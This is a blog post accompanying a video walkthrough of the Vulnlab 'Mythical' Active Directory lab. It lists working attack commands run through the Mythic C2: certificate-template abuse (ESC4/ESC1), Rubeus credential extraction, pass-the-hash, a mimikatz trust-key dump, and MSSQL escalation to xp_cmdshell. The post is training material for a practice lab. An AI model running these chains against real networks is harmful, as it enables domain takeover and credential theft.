---
categories:
- Vulnlab
image:
  path: preview.png
layout: post
media_subpath: /assets/posts/2024-12-08-vl-mythical
tags:
- active directory
- c2
- windows
- mssql
- mythic
- trust
title: VL Mythical
---

This video is a walkthrough on Mythical, a medium-difficulty AD chain on Vulnlab that is all about engaging AD environments with the Mythic C2 framework.

{% youtube CPOJt-Gujkc %}

## Notes

These are some additional notes to the video.

### Getting Started with Mythic

- The login for the Web UI here is `mythic_admin: wG4jmjNcEcfmzv3QbEcJdSVTDEjCnX`
- For real time interaction, use `sleep 0 0`
- Doing `ls` will show the interactive file browser
- To run .Net tooling from memory, use `register_assembly`, followed by `execute_assembly`
- To run PowerShell, use `powershell_import` to load a module and `powershell` or `powerpick` to run it
- To switch into another users context, use `make_token domain\user password`

### Useful Tooling

- [PortScanner](https://github.com/IceMoonHSV/PortScanner) 
- [BloodHound](https://github.com/ly4k/BloodHound) e.g. `execute_assembly SharpHound.exe -c all,gpolocalgroup`
- [Certify](https://github.com/GhostPack/Certify) e.g. `execute_assembly Certify.exe find /vulnerable`
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [StandIn](https://github.com/FuzzySecurity/StandIn)
- [PassTheHash from PowerShell](https://github.com/Kevin-Robertson/Invoke-TheHash/tree/master)


### Rsync

```terminal
shell rsync.exe --list-only rsync://192.168.25.1
shell mkdir \temp 
shell rsync -av rsync://192.168.25.1/mythical /temp
cd ..\temp
```

### ESC4 from Powershell

```terminal
Add-DomainObjectAcl -TargetIdentity Machine -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=mythical-us,DC=vl"
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mythical-us,DC=vl" -Identity Machine -XOR @{'mspki-certificate-name-flag'=1} -Verbose
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mythical-us,DC=vl" -Identity Machine -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
```

### ESC1 with Certify

```terminal
execute_assembly Certify.exe request /ca:dc01.mythical-us.vl\mythical-us-DC01-CA /template:Machine /altname:Administrator@mythical-us.vl
```

### Get NTLM Hash from Rubeus & obtain a SYSTEM beacon

Note the `/getcredentials` flag.

```terminal
execute_assembly Rubeus.exe asktgt /user:Administrator /certificate:c:\_admin\admin.pfx /ptt /nowrap /getcredentials

powershell Invoke-SMBExec -Target 127.0.0.1 -Domain mythical-us.vl -Username administrator -Hash ... -Command "c:\programdata\google\update.exe"
```

### Getting the Trust Account

```terminal
powershell Get-AdTrust -Filter *

mimikatz "lsadump::trust /patch"
```

### Using the PowerShell AD Module to get users from the second domain

```terminal
Get-ADUser -Filter * -Server "dc02.mythical-eu.vl" -Property DisplayName, SamAccountName | Select-Object DisplayName, SamAccountName
```


### Connection to MSSQL via sqlcmd and privilege escalation via db_owner

```terminal
# Verify connection
shell sqlcmd.exe -S tcp:10.10.241.247,1433 -Q "SELECT name, database_id, create_date FROM sys.databases;"

# Enumerate Trustworthy Databases and DB Owners
shell sqlcmd.exe -S tcp:10.10.241.247,1433 -Q "SELECT a.name,b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name=b.name;"
shell sqlcmd.exe -S tcp:10.10.241.247,1433 -d msdb -Q "SELECT rp.name as database_role, mp.name as database_user from sys.database_role_members drm join sys.database_principals rp on (drm.role_principal_id = rp.principal_id) join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)"

# Exploit DB_Owner
shell sqlcmd.exe -S tcp:10.10.241.247,1433 -d msdb -Q  "CREATE OR ALTER PROCEDURE dbo.xct WITH EXECUTE AS owner AS ALTER SERVER ROLE sysadmin ADD MEMBER [MYTHICAL-EU\svc_sql];"
shell sqlcmd.exe -S tcp:10.10.241.247,1433 -d msdb -Q  "EXEC dbo.xct;"
shell sqlcmd.exe -S tcp:10.10.241.247,1433 -d msdb -Q  "EXEC sp_configure 'show advanced options', 1; Reconfigure;"
shell sqlcmd.exe -S tcp:10.10.241.247,1433 -d msdb -Q  "EXEC sp_configure 'xp_cmdshell', 1; Reconfigure;"
shell sqlcmd.exe -S tcp:10.10.241.247,1433 -d msdb -Q  "EXEC xp_cmdshell 'whoami'"
```

### Create SMB Share on Windows from Commandline

```terminal
mkdir C:\temp
net share temp=C:\temp /grant:everyone,full
```